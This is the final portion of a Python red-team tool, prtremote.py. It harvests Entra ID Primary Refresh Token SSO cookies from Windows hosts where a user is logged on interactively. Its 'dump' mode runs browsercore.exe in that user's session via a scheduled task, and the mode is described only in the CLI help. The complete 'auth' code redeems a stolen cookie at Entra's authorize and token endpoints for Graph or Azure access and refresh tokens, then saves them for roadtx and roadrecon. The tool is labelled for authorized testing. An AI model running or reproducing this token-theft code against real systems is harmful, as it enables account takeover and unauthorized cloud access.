        detail = ' '.join(str(cfg[k]) for k in ('sErrorCode', 'strMainMessage',
                                                'strServiceExceptionMessage')
                          if cfg.get(k))
        if detail:
            return 'Entra refused the cookie: %s' % detail

    # Some newer pages render the error directly into HTML instead. Return only
    # the compact AADSTS message, never the full page (which may contain state).
    plain = html.unescape(re.sub(r'<[^>]+>', ' ', body))
    plain = re.sub(r'\s+', ' ', plain).strip()
    aadsts = re.search(r'(AADSTS\d+[^\r\n<]{0,500})', plain, re.IGNORECASE)
    if aadsts:
        return 'Entra refused the cookie: %s' % aadsts.group(1).strip()

    title = re.search(r'<title[^>]*>(.*?)</title>', body,
                      re.IGNORECASE | re.DOTALL)
    if title:
        title_text = re.sub(r'\s+', ' ', html.unescape(title.group(1))).strip()
        if title_text:
            return ('Entra returned an interactive page instead of a code: %s '
                    '(the cookie may be stale, or MFA/Conditional Access may be required)'
                    % title_text)
    return 'unexpected reply from /authorize (HTTP %d)' % res.status_code


def redeem_prt_cookie(cookie, resource):
    """Exchange a PRT SSO cookie for tokens. Returns the raw /token reply."""
    import requests

    claims = jwt_body(cookie)
    if 'request_nonce' not in claims:
        raise RuntimeError('the cookie has no request_nonce claim -- either it is '
                           'not a PRT SSO cookie, or it needs a session key')
    now = int(time.time())
    if claims.get('exp') is not None and int(claims['exp']) <= now:
        raise RuntimeError('the PRT SSO cookie has expired -- harvest a new one and '
                           'redeem it immediately (normally within about 5 minutes)')

    params = {
        'client_id': AUTH_CLIENT,
        'response_type': 'code',
        'haschrome': '1',
        'redirect_uri': AUTH_REDIRECT,
        'client-request-id': str(uuid.uuid4()),
        'x-client-SKU': 'PCL.Desktop',
        'x-client-Ver': '3.19.7.16602',
        'x-client-CPU': 'x64',
        'x-client-OS': 'Microsoft Windows NT 10.0.19569.0',
        'site_id': 501358,
        'sso_nonce': claims['request_nonce'],
        'mscrid': str(uuid.uuid4()),
        'resource': resource,
    }
    ses = requests.session()
    res = ses.get('%s/oauth2/authorize' % AUTHORITY, params=params,
                  headers={'UA-CPU': 'AMD64', 'User-Agent': AUTH_UA},
                  cookies={'x-ms-RefreshTokenCredential': cookie},
                  allow_redirects=False, timeout=30)

    location = res.headers.get('Location', '')
    if res.status_code != 302 or AUTH_REDIRECT.lower() not in location.lower():
        raise RuntimeError(describe_authorize_failure(res, location))
    code = parse_qs(urlparse(location).query)['code'][0]
    logging.info('Cookie accepted, authorization code issued')

    res = ses.post('%s/oauth2/token' % AUTHORITY, timeout=30,
                   data={'client_id': AUTH_CLIENT,
                         'grant_type': 'authorization_code',
                         'code': code,
                         'redirect_uri': AUTH_REDIRECT,
                         'resource': resource})
    if res.status_code != 200:
        raise RuntimeError('code redemption failed: %s' % res.text[:400])
    return res.json()


def tokenreply_to_tokendata(reply):
    """roadlib's token-file shape, so roadtx and roadrecon can read what we save
    (roadtx refreshtokento -f, roadrecon gather -f, ...)."""
    tokens = {'tokenType': reply['token_type']}
    if 'expires_on' in reply:
        expiry = datetime.datetime.fromtimestamp(int(reply['expires_on']))
    else:
        expiry = (datetime.datetime.now()
                  + datetime.timedelta(seconds=int(reply['expires_in'])))
    tokens['expiresOn'] = expiry.strftime('%Y-%m-%d %H:%M:%S')

    claims = token_claims(reply['access_token'])
    if 'tid' in claims:
        tokens['tenantId'] = claims['tid']
    tokens['_clientId'] = claims.get('appid', AUTH_CLIENT)
    for src, dst in (('access_token', 'accessToken'),
                     ('refresh_token', 'refreshToken'),
                     ('id_token', 'idToken')):
        if src in reply:
            tokens[dst] = reply[src]
    if 'expires_in' in reply:
        tokens['expiresIn'] = int(reply['expires_in'])
    return tokens


def run_auth(options):
    """auth mode: redeem a harvested PRT cookie for tokens."""
    # The JSON is this mode's output, so narration moves off stdout and it stays
    # pipeable (prtremote.py auth ... | jq -r .accessToken).
    for handler in logging.getLogger().handlers:
        if hasattr(handler, 'setStream'):
            handler.setStream(sys.stderr)

    which = 'graph' if options.graph else 'azure'
    with open(options.prt) as fh:
        cookie = fh.read().strip()
    logging.info('Redeeming %s for %s', options.prt, RESOURCES[which])

    reply = redeem_prt_cookie(cookie, RESOURCES[which])
    tokens = tokenreply_to_tokendata(reply)
    claims = token_claims(reply['access_token'])
    user = claims.get('upn') or claims.get('unique_name') or claims.get('oid') or 'unknown'

    outfile = options.tokenfile or 'tokens_%s_%s.json' % (
        user.split('@')[0].replace('\\', '_') or 'user', which)
    with open(outfile, 'w') as fh:
        json.dump(tokens, fh, indent=2, sort_keys=True)

    print(json.dumps(tokens, indent=2, sort_keys=True))

    logging.info('Tokens for %s in tenant %s, valid until %s', user,
                 tokens.get('tenantId', '?'), tokens['expiresOn'])
    logging.info('Saved to %s', outfile)
    if 'refreshToken' in tokens:
        logging.info('A refresh token is included -- switch resources later with: '
                     'roadtx refreshtokento -r <resource> --tokenfile %s', outfile)
    return 0


# =========================================================================== #
# CLI
# =========================================================================== #

def add_common_args(parser):
    parser.add_argument('target', action='store',
                        help='[[domain/]username[:password]@]<target name or address>')
    parser.add_argument('-debug', action='store_true', help='turn DEBUG output ON')

    conn = parser.add_argument_group('connection')
    conn.add_argument('-dc-ip', action='store', metavar='IP',
                      help='domain controller IP (default: the target FQDN domain part)')
    conn.add_argument('-target-ip', action='store', metavar='IP',
                      help='target IP, when the target is an unresolvable NetBIOS name')
    conn.add_argument('-port', choices=['139', '445'], nargs='?', default='445',
                      metavar='PORT', help='SMB port (default: 445)')

    auth = parser.add_argument_group('authentication')
    auth.add_argument('-hashes', action='store', metavar='LMHASH:NTHASH',
                      help='NTLM hashes')
    auth.add_argument('-no-pass', action='store_true', help="don't ask for a password")
    auth.add_argument('-k', action='store_true',
                      help='use Kerberos, from the KRB5CCNAME ccache')
    auth.add_argument('-aesKey', action='store', metavar='HEX',
                      help='AES key for Kerberos authentication')


def build_parser():
    parser = argparse.ArgumentParser(
        add_help=True, prog='prtremote.py',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description='Remote PRT SSO cookie tooling for Entra/hybrid-joined Windows '
                    'hosts. Authorized security testing only.',
        epilog="examples:\n"
               "  prtremote.py check ENDPOINT/labadmin:\"$PASSWORD\"@win11\n"
               "  prtremote.py dump  ENDPOINT/labadmin:\"$PASSWORD\"@win11 -run-user achen\n"
               "  prtremote.py auth  --prt prt_cookie_win11_achen.txt --graph\n")
    sub = parser.add_subparsers(dest='mode', metavar='{check,dump,auth}')

    check = sub.add_parser('check', add_help=True,
        help='fingerprint a host: Entra registration + live interactive sessions',
        description='Read Entra registration (CloudDomainJoin) and live interactive '
                    'sessions (loaded HKEY_USERS hives) over MS-RRP, to decide whether '
                    'and whose PRT can be harvested. Needs local admin; starts '
                    'RemoteRegistry if stopped and restores its state afterwards.')
    add_common_args(check)

    dump = sub.add_parser('dump', add_help=True,
        help="harvest -run-user's PRT SSO cookie",
        description="Harvest a PRT SSO cookie: upload a BrowserCore native-messaging "
                    "request built locally, run 'browsercore.exe < request > response' "
                    "in -run-user's interactive session (InteractiveToken scheduled "
                    'task), pull the response back over C$ and parse the cookie out of '
                    'it. Needs local admin, and -run-user must be logged on '
                    'interactively.')
    add_common_args(dump)
    dump.add_argument('-run-user', action='store', required=True, metavar='[DOMAIN\\]USER',
                      help='whose session runs browsercore.exe, i.e. whose PRT you '
                           'collect. Domain prefix optional')
    dump.add_argument('-timeout', action='store', type=int, default=45, metavar='SECS',
                      help='how long to wait for the response (default: 45)')
    dump.add_argument('-poll', action='store', type=float, default=2.0, metavar='SECS',
                      help='SMB poll interval while waiting (default: 2)')

    auth = sub.add_parser('auth', add_help=True,
        help='redeem a harvested PRT cookie for tokens',
        description='Exchange a PRT SSO cookie for access/refresh tokens -- the same '
                    "flow as 'roadtx gettokens --prt-cookie', no browser. Prints the "
                    'tokens as JSON on stdout (narration goes to stderr, so it pipes) '
                    'and saves them in the roadtx/roadrecon token-file format. Runs '
                    'entirely against Entra: no target, no credentials.')
    auth.add_argument('-prt', '--prt', action='store', required=True, metavar='FILE',
                      help='file holding the PRT SSO cookie, as written by dump')
    resource = auth.add_mutually_exclusive_group(required=True)
    resource.add_argument('-graph', '--graph', action='store_true',
                          help='tokens for Microsoft Graph (%s)' % RESOURCES['graph'])
    resource.add_argument('-azure', '--azure', action='store_true',
                          help='tokens for the Azure management API (%s)'
                               % RESOURCES['azure'])
    auth.add_argument('-f', '--tokenfile', action='store', metavar='FILE', default=None,
                      help='where to save the tokens (default: '
                           './tokens_<user>_<graph|azure>.json)')
    auth.add_argument('-debug', action='store_true', help='turn DEBUG output ON')

    return parser


def main():
    print(version.BANNER, file=sys.stderr)

    parser = build_parser()
    if len(sys.argv) == 1:
        parser.print_help()
        return 1
    options = parser.parse_args()
    if options.mode is None:
        parser.print_help()
        return 1

    init_logging(debug=options.debug)
    if options.debug:
        logging.debug(version.getInstallationPath())

    try:
        # auth mode talks only to Entra -- no target, no credentials to resolve.
        if options.mode == 'auth':
            return run_auth(options)

        domain, username, password, remoteName = parse_target(options.target)
        if domain is None:
            domain = ''
        if not remoteName:
            logging.error('A target host is required')
            return 1
        if options.aesKey is not None:
            options.k = True
        if password == '' and username != '' and options.hashes is None \
                and options.no_pass is False and options.aesKey is None and not options.k:
            from getpass import getpass
            password = getpass('Password:')
        if options.target_ip is None:
            options.target_ip = remoteName

        handler = run_check if options.mode == 'check' else run_dump
        return handler(options, domain, username, password, remoteName)
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(str(e))
        return 1


if __name__ == '__main__':
    sys.exit(main())
